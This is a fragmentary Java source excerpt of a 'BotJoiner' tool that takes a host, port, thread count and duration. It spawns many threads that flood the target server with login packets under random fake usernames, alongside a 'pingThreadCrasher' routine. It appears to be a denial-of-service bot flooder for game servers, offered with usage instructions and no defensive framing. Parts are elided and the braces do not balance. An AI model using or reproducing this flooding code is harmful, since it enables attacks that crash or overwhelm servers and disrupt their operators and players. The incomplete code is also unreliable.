...
public class BotJoiner {
	...
	public static void main(String[] args) {
		if (args.length == 4) {
			try {
				BotJoiner.pingThreadCrasher(args[0], Integer.valueOf(args[1]), Integer.valueOf(args[2]),
			...
			System.out.println();
			System.out.println("java -jar botjoiner.jar <host> <port> <threads> <time>");
			System.out.println();
			...
			if (threads < maxThreads) {
				new Thread() {
					...
					public void run() {
						++threads;
						try {
							BotJoiner.pingBytes(number + 1);

							BotJoiner.botjoiner(host, port);
	...
	public static void botjoiner(String host, int port)
			...
			if (random.nextBoolean()) {
				PacketUtils.sendPacket(PacketUtils.createLogin("" + random.nextInt(9999)), out);

			} else {

				if (random.nextBoolean()) {
					PacketUtils.sendPacket(PacketUtils.createLogin("" + UUID.randomUUID().toString().split("-")[0]), out);
					}
				}
			}
		}
